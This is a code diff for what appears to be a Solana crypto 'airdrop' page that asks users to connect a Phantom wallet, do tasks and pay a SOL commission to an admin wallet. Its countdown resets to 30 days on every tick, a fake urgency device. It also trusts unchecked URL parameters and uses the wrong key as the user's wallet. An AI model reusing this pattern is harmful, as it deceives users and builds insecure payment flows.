@@ -22,7 +22,34 @@ let connectedWallet = INITIAL_WALLET_ADDRESS;
 let phantomProvider = null;
 let phantomDetected = false;
 
-// **New: Enhanced Phantom detection**
+// **Fixed: Countdown Timer**
+function updateCountdown() {
+    // Set the target date (30 days from now for example)
+    const targetDate = new Date();
+    targetDate.setDate(targetDate.getDate() + 30);
+    
+    const now = new Date().getTime();
+    const distance = targetDate.getTime() - now;
+    
+    if (distance > 0) {
+        const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+        const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+        const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+        const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+        
+        document.getElementById('days').textContent = days.toString().padStart(2, '0');
+        document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
+        document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
+        document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
+    } else {
+        document.getElementById('days').textContent = '00';
+        document.getElementById('hours').textContent = '00';
+        document.getElementById('minutes').textContent = '00';
+        document.getElementById('seconds').textContent = '00';
+    }
+}
+
+// Enhanced Phantom detection
 async function detectPhantomWallet() {
     console.log("🔍 Starting Phantom detection...");
     
@@ -67,12 +94,13 @@ async function getPhantomProvider() {
     return phantomProvider;
 }
 
-// **New: Show intermediate modal**
+// Show intermediate modal with user data
 function showPhantomIntermediateModal(type, data) {
     const modal = document.getElementById('phantom-intermediate-modal');
     const title = document.getElementById('intermediate-modal-title');
     const content = document.getElementById('intermediate-modal-content');
     const actionBtn = document.getElementById('intermediate-action-btn');
+    const closeBtn = document.getElementById('intermediate-close-btn');
     
     if (!modal || !title || !content || !actionBtn) {
         console.error("Modal elements not found");
@@ -80,39 +108,42 @@ function showPhantomIntermediateModal(type, data) {
     }
     
     if (type === 'connect') {
-        title.textContent = 'Connect to Phantom Wallet';
+        title.textContent = 'Connect Wallet';
         content.innerHTML = `
-            <p>The following information will be sent to connect to Phantom wallet:</p>
+            <p>Your user data will be sent to external browser:</p>
             <div class="data-display">
-                <p><strong>Request Type:</strong> Wallet Connection</p>
+                <p><strong>User ID:</strong> ${USER_ID || 'Guest'}</p>
                 <p><strong>Domain:</strong> ${window.location.host}</p>
                 <p><strong>Network:</strong> Solana Devnet</p>
+                <p><strong>Action:</strong> Connect Phantom Wallet</p>
             </div>
-            <p>Do you want to proceed to the external browser to open Phantom app?</p>
+            <p>Click Connect Wallet to proceed:</p>
         `;
-        actionBtn.textContent = 'Open Phantom';
-        actionBtn.onclick = () => openPhantomForConnect(data.deeplink);
+        actionBtn.textContent = 'Connect Wallet';
+        actionBtn.onclick = () => redirectToExternalBrowser(data.deeplink);
     } else if (type === 'transaction') {
         title.textContent = 'Send Transaction';
         content.innerHTML = `
-            <p>The following transaction will be sent to Phantom wallet:</p>
+            <p>Your transaction data will be sent to external browser:</p>
             <div class="data-display">
-                <p><strong>Transaction Type:</strong> Commission Payment</p>
+                <p><strong>User ID:</strong> ${USER_ID || 'Guest'}</p>
                 <p><strong>Amount:</strong> ${COMMISSION_AMOUNT} SOL</p>
                 <p><strong>Recipient:</strong> ${ADMIN_WALLET}</p>
                 <p><strong>Network:</strong> Solana Devnet</p>
             </div>
-            <p>Do you want to proceed to the external browser to open Phantom app?</p>
+            <p>Click Connect Wallet to proceed:</p>
         `;
-        actionBtn.textContent = 'Open Phantom';
-        actionBtn.onclick = () => openPhantomForTransaction(data.deeplink);
+        actionBtn.textContent = 'Connect Wallet';
+        actionBtn.onclick = () => redirectToExternalBrowser(data.deeplink);
     }
+    
+    closeBtn.onclick = closeIntermediateModal;
     
     modal.style.display = 'flex';
     modal.classList.add('show');
 }
 
-// **New: Close intermediate modal**
+// Close intermediate modal
 function closeIntermediateModal() {
     const modal = document.getElementById('phantom-intermediate-modal');
     if (modal) {
@@ -123,56 +154,112 @@ function closeIntermediateModal() {
     }
 }
 
-// **New: Open Phantom for connection**
-function openPhantomForConnect(deeplink) {
+// Redirect to external browser with Open Phantom App button
+function redirectToExternalBrowser(deeplink) {
     closeIntermediateModal();
     
-    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-    
-    if (isMobile) {
-        window.location.href = deeplink;
-        
-        setTimeout(() => {
-            const phantom_app_url = /iPhone|iPad|iPod/.test(navigator.userAgent) 
-                ? "https://apps.apple.com/app/phantom-solana-wallet/1598432977"
-                : "https://play.google.com/store/apps/details?id=app.phantom";
-            window.open(phantom_app_url, '_blank');
-        }, 3000);
+    // Create a new page content for external browser
+    const newWindow = window.open('', '_blank');
+    if (newWindow) {
+        newWindow.document.write(`
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Connect to Phantom</title>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <style>
+                    body {
+                        font-family: 'Arial', sans-serif;
+                        background: linear-gradient(135deg, #1a1a1a, #2d2d2d);
+                        margin: 0;
+                        padding: 20px;
+                        min-height: 100vh;
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        color: white;
+                    }
+                    .container {
+                        background: #1a1a1a;
+                        padding: 40px;
+                        border-radius: 20px;
+                        text-align: center;
+                        max-width: 500px;
+                        width: 100%;
+                        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+                        border: 2px solid #333;
+                    }
+                    h1 {
+                        color: #AB9FF2;
+                        margin-bottom: 20px;
+                        font-size: 28px;
+                    }
+                    p {
+                        color: #ccc;
+                        line-height: 1.6;
+                        margin-bottom: 30px;
+                        font-size: 16px;
+                    }
+                    .phantom-btn {
+                        background: linear-gradient(135deg, #AB9FF2, #7B68EE);
+                        color: white;
+                        border: none;
+                        padding: 15px 30px;
+                        border-radius: 10px;
+                        font-size: 18px;
+                        font-weight: 600;
+                        cursor: pointer;
+                        transition: all 0.3s ease;
+                        text-decoration: none;
+                        display: inline-block;
+                        margin: 10px;
+                    }
+                    .phantom-btn:hover {
+                        background: linear-gradient(135deg, #9A8DF0, #6A57DC);
+                        transform: translateY(-2px);
+                    }
+                    .data-info {
+                        background: #2d2d2d;
+                        padding: 20px;
+                        border-radius: 10px;
+                        margin: 20px 0;
+                        border: 1px solid #444;
+                        text-align: left;
+                    }
+                    .data-info p {
+                        margin: 8px 0;
+                        font-size: 14px;
+                    }
+                    .data-info strong {
+                        color: #AB9FF2;
+                    }
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <h1>🦄 Connect to Phantom</h1>
+                    <p>You are being redirected to connect your Phantom wallet. Your user data has been processed:</p>
+                    <div class="data-info">
+                        <p><strong>User ID:</strong> ${USER_ID || 'Guest'}</p>
+                        <p><strong>Domain:</strong> ${window.location.host}</p>
+                        <p><strong>Network:</strong> Solana Devnet</p>
+                        <p><strong>Status:</strong> Ready to connect</p>
+                    </div>
+                    <p>Click the button below to open Phantom app:</p>
+                    <a href="${deeplink}" class="phantom-btn">Open Phantom App</a>
+                </div>
+            </body>
+            </html>
+        `);
+        newWindow.document.close();
     } else {
-        if (phantomProvider) {
-            connectWalletDirect();
-        } else {
-            showToast("Please install Phantom extension first", "info");
-            window.open("https://phantom.app/download", '_blank');
-        }
+        // Fallback if popup blocked
+        window.location.href = deeplink;
     }
 }
 
-// **New: Open Phantom for transaction**
-function openPhantomForTransaction(deeplink) {
-    closeIntermediateModal();
-    
-    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-    
-    if (isMobile) {
-        window.location.href = deeplink;
-        
-        setTimeout(() => {
-            const phantom_app_url = /iPhone|iPad|iPod/.test(navigator.userAgent) 
-                ? "https://apps.apple.com/app/phantom-solana-wallet/1598432977"
-                : "https://play.google.com/store/apps/details?id=app.phantom";
-            window.open(phantom_app_url, '_blank');
-        }, 3000);
-    } else {
-        if (phantomProvider && connectedWallet) {
-            sendCommissionTransaction();
-        } else {
-            showToast("Please connect wallet first", "error");
-        }
-    }
-}
-
-// **Modified: Wallet connection handler**
+// Wallet connection handler
 async function handleWalletConnection() {
     if (!tasksCompleted.wallet) {
         await connectWallet();
@@ -232,6 +319,7 @@ async function connectWalletDirect() {
         if (saveResponse.ok) {
             tasksCompleted.wallet = true;
             updateWalletUI();
+            updateTasksUI();
             showToast("Wallet connected successfully!", "success");
         } else {
             throw new Error("Failed to save wallet connection");
@@ -243,7 +331,7 @@ async function connectWalletDirect() {
     }
 }
 
-// **Modified: Commission payment**
+// Commission payment
 async function payCommission() {
     if (!connectedWallet) {
         showToast("Please connect wallet first", "error");
@@ -282,26 +370,12 @@ async function payCommission() {
 
 async function sendCommissionTransaction() {
     try {
-        const { Connection, PublicKey, Transaction, SystemProgram } = window.solanaWeb3;
-        const connection = new Connection(SOLANA_RPC_URL);
-        
-        const fromPubkey = new PublicKey(connectedWallet);
-        const toPubkey = new PublicKey(ADMIN_WALLET);
-        const lamports = Math.floor(COMMISSION_AMOUNT * 1000000000);
-        
-        const transaction = new Transaction().add(
-            SystemProgram.transfer({
-                fromPubkey: fromPubkey,
-                toPubkey: toPubkey,
-                lamports: lamports,
-            })
-        );
-        
-        const { blockhash } = await connection.getRecentBlockhash();
-        transaction.recentBlockhash = blockhash;
-        transaction.feePayer = fromPubkey;
+        const transaction = await createCommissionTransaction();
         
         const signedTransaction = await phantomProvider.signTransaction(transaction);
+        
+        const { Connection } = window.solanaWeb3;
+        const connection = new Connection(SOLANA_RPC_URL);
         const signature = await connection.sendRawTransaction(signedTransaction.serialize());
         
         const confirmResponse = await fetch('/airdrop/confirm_commission', {
@@ -316,7 +390,7 @@ async function sendCommissionTransaction() {
         
         if (confirmResponse.ok) {
             tasksCompleted.pay = true;
-            updateCommissionUI();
+            updateTasksUI();
             showToast("Commission paid successfully!", "success");
         } else {
             throw new Error("Failed to confirm transaction");
@@ -328,164 +402,186 @@ async function sendCommissionTransaction() {
     }
 }
 
-// **New: Handle Phantom redirects**
-function handlePhantomRedirect() {
-    const urlParams = new URLSearchParams(window.location.search);
-    const action = urlParams.get('phantom_action');
+async function createCommissionTransaction() {
+    const { Connection, PublicKey, Transaction, SystemProgram } = window.solanaWeb3;
+    const connection = new Connection(SOLANA_RPC_URL);
     
-    if (action === 'connect') {
-        const publicKey = urlParams.get('public_key');
-        
-        if (publicKey) {
-            connectedWallet = publicKey;
+    const fromPubkey = new PublicKey(connectedWallet);
+    const toPubkey = new PublicKey(ADMIN_WALLET);
+    const lamports = Math.floor(COMMISSION_AMOUNT * 1000000000);
+    
+    const transaction = new Transaction().add(
+        SystemProgram.transfer({
+            fromPubkey: fromPubkey,
+            toPubkey: toPubkey,
+            lamports: lamports,
+        })
+    );
+    
+    const { blockhash } = await connection.getRecentBlockhash();
+    transaction.recentBlockhash = blockhash;
+    transaction.feePayer = fromPubkey;
+    
+    return transaction;
+}
+
+// **Fixed: Task completion handlers**
+async function handleTaskCompletion() {
+    if (!tasksCompleted.task) {
+        try {
+            const response = await fetch('/airdrop/complete_task', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                }
+            });
             
-            fetch('/airdrop/connect_wallet', {
+            if (response.ok) {
+                tasksCompleted.task = true;
+                updateTasksUI();
+                showToast("Tasks completed successfully!", "success");
+            } else {
+                showToast("Failed to complete tasks", "error");
+            }
+        } catch (error) {
+            console.error("Error completing tasks:", error);
+            showToast("Error completing tasks", "error");
+        }
+    }
+}
+
+// **Fixed: Invite friends handler**
+async function handleInviteCheck() {
+    if (!tasksCompleted.invite) {
+        try {
+            const response = await fetch('/airdrop/check_invites', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    wallet: connectedWallet
-                })
-            }).then(response => {
-                if (response.ok) {
-                    tasksCompleted.wallet = true;
-                    updateWalletUI();
-                    showToast("Wallet connected successfully!", "success");
                 }
             });
-        }
-        
-        window.history.replaceState({}, document.title, window.location.pathname);
-        
-    } else if (action === 'sign') {
-        const signature = urlParams.get('signature');
-        
-        if (signature) {
-            fetch('/airdrop/confirm_commission', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    signature: signature
-                })
-            }).then(response => {
-                if (response.ok) {
-                    tasksCompleted.pay = true;
-                    updateCommissionUI();
-                    showToast("Commission paid successfully!", "success");
+            
+            if (response.ok) {
+                const data = await response.json();
+                if (data.invited) {
+                    tasksCompleted.invite = true;
+                    updateTasksUI();
+                    showToast("Friends invitation verified!", "success");
                 } else {
-                    showToast("Error confirming transaction", "error");
+                    showToast("No friends invited yet", "info");
                 }
-            });
+            } else {
+                showToast("Failed to check invitations", "error");
+            }
+        } catch (error) {
+            console.error("Error checking invites:", error);
+            showToast("Error checking invitations", "error");
         }
-        
-        window.history.replaceState({}, document.title, window.location.pathname);
     }
 }
 
-// **New: UI update functions**
-function updateWalletUI() {
-    const button = document.getElementById('wallet-button-text');
-    const icon = document.getElementById('wallet-icon');
-    const indicator = document.getElementById('wallet-status-indicator');
-    const addressDiv = document.getElementById('wallet-address-dropdown');
+// **Fixed: Update tasks UI**
+function updateTasksUI() {
+    // Task completion
+    const taskBox = document.getElementById('task-completion');
+    const taskButton = taskBox.querySelector('.task-button');
+    const taskIcon = taskBox.querySelector('.right-icon');
     
-    if (tasksCompleted.wallet && connectedWallet) {
-        button.textContent = 'Wallet Connected';
-        icon.className = 'fas fa-check right-icon';
-        indicator.classList.add('connected');
-        
-        if (addressDiv) {
-            addressDiv.textContent = connectedWallet;
-        }
+    if (tasksCompleted.task) {
+        taskButton.classList.add('tasks-completed');
+        taskIcon.className = 'fas fa-check right-icon';
+        taskBox.classList.add('completed');
     }
-}
-
-function updateCommissionUI() {
-    const button = document.getElementById('commission-button-text');
-    const icon = document.getElementById('commission-icon');
+    
+    // Invite friends
+    const inviteBox = document.getElementById('inviting-friends');
+    const inviteButton = inviteBox.querySelector('.task-button');
+    const inviteIcon = inviteBox.querySelector('.right-icon');
+    
+    if (tasksCompleted.invite) {
+        inviteButton.classList.add('friends-invited');
+        inviteIcon.className = 'fas fa-check right-icon';
+        inviteBox.classList.add('completed');
+    }
+    
+    // Commission payment
+    const commissionBox = document.getElementById('pay-commission');
+    const commissionButton = commissionBox.querySelector('.task-button');
+    const commissionIcon = commissionBox.querySelector('.right-icon');
     
     if (tasksCompleted.pay) {
-        button.textContent = 'Commission Paid';
-        icon.className = 'fas fa-check right-icon';
+        commissionButton.classList.add('commission-paid');
+        commissionIcon.className = 'fas fa-check right-icon';
+        commissionBox.classList.add('completed');
+    }
+    
+    updateWalletUI();
+}
+
+function updateWalletUI() {
+    const walletButtonText = document.getElementById('wallet-button-text');
+    const walletIcon = document.getElementById('wallet-icon');
+    const walletButton = document.querySelector('.wallet-connect-button');
+    const walletIndicator = document.getElementById('wallet-status-indicator');
+    const walletDropdownContent = document.getElementById('wallet-dropdown-content');
+    const walletAddressDropdown = document.getElementById('wallet-address-dropdown');
+    const connectWalletBox = document.getElementById('connect-wallet');
+    
+    if (tasksCompleted.wallet && connectedWallet) {
+        walletButtonText.textContent = 'Wallet Connected';
+        walletIcon.className = 'fas fa-check right-icon';
+        walletButton.classList.add('wallet-connected');
+        walletIndicator.classList.add('connected');
+        connectWalletBox.classList.add('completed');
+        
+        if (walletAddressDropdown) {
+            walletAddressDropdown.textContent = connectedWallet;
+        }
+    } else {
+        walletButtonText.textContent = 'Connect Wallet';
+        walletIcon.className = 'fas fa-chevron-right right-icon';
+        walletButton.classList.remove('wallet-connected');
+        walletIndicator.classList.remove('connected');
+        connectWalletBox.classList.remove('completed');
+        
+        if (walletDropdownContent) {
+            walletDropdownContent.classList.remove('show');
+        }
     }
 }
 
-function showToast(message, type = 'info') {
-    const existingToasts = document.querySelectorAll('.toast');
-    existingToasts.forEach(toast => toast.remove());
-    
-    const toast = document.createElement('div');
-    toast.className = `toast toast-${type}`;
-    toast.textContent = message;
-    document.body.appendChild(toast);
-    
-    setTimeout(() => toast.classList.add('show'), 100);
-    
-    setTimeout(() => {
-        toast.classList.remove('show');
-        setTimeout(() => toast.remove(), 300);
-    }, 5000);
-}
-
-// Keep original functions
+// Wallet dropdown functions
 function toggleWalletDropdown() {
-    if (!tasksCompleted.wallet) return;
-    
-    const dropdown = document.getElementById('wallet-dropdown-content');
-    if (dropdown) {
-        dropdown.classList.toggle('show');
-    }
-}
-
-async function disconnectWallet() {
-    try {
-        if (phantomProvider && phantomProvider.disconnect) {
-            await phantomProvider.disconnect();
+    if (tasksCompleted.wallet) {
+        const dropdown = document.getElementById('wallet-dropdown-content');
+        if (dropdown) {
+            dropdown.classList.toggle('show');
         }
-        
-        const response = await fetch('/airdrop/connect_wallet', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                wallet: ""
-            })
-        });
-        
-        if (response.ok) {
-            connectedWallet = null;
-            tasksCompleted.wallet = false;
-            tasksCompleted.pay = false;
-            
-            // Reset UI
-            document.getElementById('wallet-button-text').textContent = 'Connect Wallet';
-            document.getElementById('wallet-icon').className = 'fas fa-chevron-right right-icon';
-            document.getElementById('wallet-status-indicator').classList.remove('connected');
-            document.getElementById('commission-button-text').textContent = 'Pay for the Commission';
-            document.getElementById('commission-icon').className = 'fas fa-chevron-right right-icon';
-            
-            showToast("Wallet disconnected", "info");
-            
-            const dropdown = document.getElementById('wallet-dropdown-content');
-            if (dropdown) {
-                dropdown.classList.remove('show');
-            }
-        }
-    } catch (error) {
-        console.error("Disconnect failed:", error);
-        showToast("Error disconnecting wallet", "error");
     }
 }
 
 function changeWallet() {
     disconnectWallet();
-    setTimeout(() => connectWallet(), 500);
+    setTimeout(() => {
+        connectWallet();
+    }, 500);
 }
 
+function disconnectWallet() {
+    connectedWallet = '';
+    tasksCompleted.wallet = false;
+    updateWalletUI();
+    updateTasksUI();
+    
+    const dropdown = document.getElementById('wallet-dropdown-content');
+    if (dropdown) {
+        dropdown.classList.remove('show');
+    }
+    
+    showToast("Wallet disconnected", "info");
+}
+
+// Phantom modal functions
 function showPhantomModal() {
     const modal = document.getElementById('phantom-modal');
     if (modal) {
@@ -505,62 +601,100 @@ function closePhantomModal() {
 }
 
 function openPhantomApp() {
-    const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|OperaMini/i.test(navigator.userAgent);
+    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     
     if (isMobile) {
-        window.location.href = "phantom://browse/" + encodeURIComponent(window.location.href);
-        
-        setTimeout(() => {
-            window.open("https://phantom.app/download", "_blank");
-        }, 2000);
+        const phantom_app_url = /iPhone|iPad|iPod/.test(navigator.userAgent) 
+            ? "https://apps.apple.com/app/phantom-solana-wallet/1598432977"
+            : "https://play.google.com/store/apps/details?id=app.phantom";
+        window.open(phantom_app_url, '_blank');
     } else {
-        showToast("Please install Phantom extension for your browser", "info");
-        window.open("https://phantom.app/download", "_blank");
+        window.open("https://phantom.app/download", '_blank');
     }
     
     closePhantomModal();
 }
 
-// Initialize on page load
-document.addEventListener('DOMContentLoaded', async function() {
-    console.log("🚀 DOM loaded, initializing application...");
+// Toast notification function
+function showToast(message, type = 'info') {
+    const toast = document.createElement('div');
+    toast.className = `toast toast-${type}`;
+    toast.textContent = message;
     
+    document.body.appendChild(toast);
+    
+    setTimeout(() => {
+        toast.classList.add('show');
+    }, 100);
+    
+    setTimeout(() => {
+        toast.classList.remove('show');
+        setTimeout(() => {
+            if (document.body.contains(toast)) {
+                document.body.removeChild(toast);
+            }
+        }, 300);
+    }, 3000);
+}
+
+// Handle URL parameters for Phantom redirects
+function handlePhantomRedirect() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const phantomAction = urlParams.get('phantom_action');
+    
+    if (phantomAction === 'connect') {
+        const publicKey = urlParams.get('phantom_encryption_public_key');
+        if (publicKey) {
+            connectedWallet = publicKey;
+            tasksCompleted.wallet = true;
+            updateWalletUI();
+            updateTasksUI();
+            showToast("Wallet connected successfully!", "success");
+            
+            // Clean URL
+            window.history.replaceState({}, document.title, window.location.pathname);
+        }
+    } else if (phantomAction === 'sign') {
+        const signature = urlParams.get('signature');
+        if (signature) {
+            tasksCompleted.pay = true;
+            updateTasksUI();
+            showToast("Commission paid successfully!", "success");
+            
+            // Clean URL
+            window.history.replaceState({}, document.title, window.location.pathname);
+        }
+    }
+}
+
+// Initialize everything when page loads
+document.addEventListener('DOMContentLoaded', function() {
+    console.log("🚀 Page loaded, initializing...");
+    
+    // **Fixed: Start countdown timer**
+    updateCountdown();
+    setInterval(updateCountdown, 1000);
+    
+    // Initialize UI state
+    updateTasksUI();
+    
+    // Handle Phantom redirects
     handlePhantomRedirect();
     
-    phantomProvider = await getPhantomProvider();
+    // Initialize Phantom provider
+    getPhantomProvider();
     
-    if (phantomProvider) {
-        console.log("✅ Phantom successfully detected!");
-    } else {
-        console.log("⚠️ Phantom not found - user needs to install it");
-    }
-    
-    updateWalletUI();
-    updateCommissionUI();
-    
-    // Close intermediate modal on cancel
-    document.getElementById('intermediate-close-btn').addEventListener('click', closeIntermediateModal);
-    
-    // Close dropdowns when clicking outside
-    document.addEventListener('click', function(e) {
-        if (!e.target.closest('.wallet-dropdown')) {
-            const dropdowns = document.querySelectorAll('.wallet-dropdown-content.show');
-            dropdowns.forEach(dropdown => {
-                dropdown.classList.remove('show');
-            });
-        }
-    });
+    console.log("✅ Initialization complete");
 });
 
-// Keep all other original functions as they were...
-function handleTaskCompletion() {
-    // Original function
-}
-
-function handleInviteCheck() {
-    // Original function  
-}
-
-function initCountdown() {
-    // Original function
-}
+// Close dropdown when clicking outside
+document.addEventListener('click', function(event) {
+    const walletDropdown = document.getElementById('wallet-dropdown');
+    const walletDropdownContent = document.getElementById('wallet-dropdown-content');
+    
+    if (walletDropdown && !walletDropdown.contains(event.target)) {
+        if (walletDropdownContent) {
+            walletDropdownContent.classList.remove('show');
+        }
+    }
+});
